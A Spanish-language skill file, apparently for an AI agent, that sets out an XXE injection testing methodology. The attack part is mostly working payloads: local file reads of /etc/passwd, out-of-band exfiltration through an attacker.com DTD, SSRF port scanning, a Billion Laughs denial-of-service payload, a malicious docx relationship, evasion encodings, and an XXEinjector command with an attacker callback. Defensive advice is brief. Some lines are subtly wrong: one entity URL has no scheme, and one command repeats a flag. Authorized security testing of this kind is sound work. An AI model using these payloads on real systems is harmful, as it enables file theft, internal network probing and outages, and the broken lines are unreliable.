---
name: xxe-testing
description: Habilidades profesionales y metodología para pruebas de inyección de entidades externas XML (XXE)
version: 1.0.0
---

# Pruebas de inyección de entidades externas XML (XXE)

## Descripción general

La inyección XXE (XML External Entity) es una vulnerabilidad que aprovecha el procesamiento de entidades externas por parte de un analizador XML. Esta habilidad proporciona métodos para la detección, explotación y protección contra vulnerabilidades XXE.

## Principio de la vulnerabilidad

Cuando un analizador XML procesa entidades externas, puede leer archivos locales, realizar ataques SSRF o causar denegación de servicio. Es común en:
- Análisis de documentos XML
- Servicios SOAP
- Documentos de Office (.docx, .xlsx, etc.)
- Imágenes SVG
- Archivos PDF

## Métodos de prueba

### 1. Identificar puntos de entrada XML

- Funciones de carga de archivos
- Interfaces API que aceptan datos XML
- Solicitudes SOAP
- Procesamiento de documentos de Office
- Funciones de importación de datos

### 2. Detección básica de XXE

**Probar entidades externas:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Probar solicitudes de red (SSRF):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/">
]>
<foo>&xxe;</foo>
```

### 3. Detección de XXE ciego

**Cuando la respuesta no muestra el contenido directamente:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/?file=/etc/passwd">
]>
<foo>&xxe;</foo>
```

**Uso de entidades de parámetros:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

**Contenido de evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;
%exfil;
```

## Técnicas de explotación

### Lectura de archivos

**Leer archivos locales:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Rutas de Windows:**
```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
```

### Ataque SSRF

**Detección de red interna:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>
```

**Escaneo de puertos:**
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379">
```

### Denegación de servicio

**Ataque Billion Laughs:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<foo>&lol9;</foo>
```

### XXE en documentos de Office

**Estructura de archivo docx:**
```
word/document.xml - Contiene el contenido del documento
word/_rels/document.xml.rels - Contiene referencias externas
```

**Modificar document.xml.rels:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships>
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="file:///etc/passwd" TargetMode="External"/>
</Relationships>
```

## Técnicas de evasión

### Diferentes protocolos

**PHP:**
```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
```

**Java:**
```xml
<!ENTITY xxe SYSTEM "jar:file:///path/to/file.zip!/file.txt">
```

**Evasión mediante codificación:**
```xml
<!ENTITY xxe SYSTEM "file:///%65%74%63/%70%61%73%73%77%64">
```

### Entidades de parámetros

**Uso de entidades de parámetros para evadir ciertas restricciones:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>test</foo>
```

## Uso de herramientas

### XXEinjector

```bash
# Uso básico
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml

# Lectura de archivos
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml --oob=http://attacker.com --path=/etc/passwd
```

### Burp Suite

1. Interceptar solicitudes que contienen XML
2. Enviar al Repeater
3. Modificar el contenido XML, agregar entidades externas
4. Observar la respuesta o los datos exfiltrados

## Verificación y reporte

### Pasos de verificación

1. Confirmar que el analizador XML procesa entidades externas
2. Verificar si la lectura de archivos o SSRF es exitosa
3. Evaluar el alcance del impacto (archivos confidenciales, acceso a la red interna, etc.)
4. Registrar el PoC completo

### Puntos clave del reporte

- Ubicación de la vulnerabilidad y punto de entrada XML
- Archivos legibles o recursos de la red interna accesibles
- Pasos completos de explotación y PoC
- Sugerencias de remediación (deshabilitar entidades externas, usar listas blancas, etc.)

## Medidas de protección

### Soluciones recomendadas

1. **Deshabilitar entidades externas**
   ```java
   // Java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

2. **Usar validación de lista blanca**
   - Validar la estructura XML
   - Restringir las entidades permitidas

3. **Usar analizadores seguros**
   - Usar analizadores que no procesen DTD
   - Usar JSON en lugar de XML

## Consideraciones

- Realizar solo en entornos de pruebas de seguridad autorizados
- Evitar la lectura de archivos confidenciales que causen fugas de datos
- Prestar atención a las diferencias en el manejo de XXE en diferentes lenguajes y bibliotecas
- Prestar atención al formato del archivo al probar documentos de Office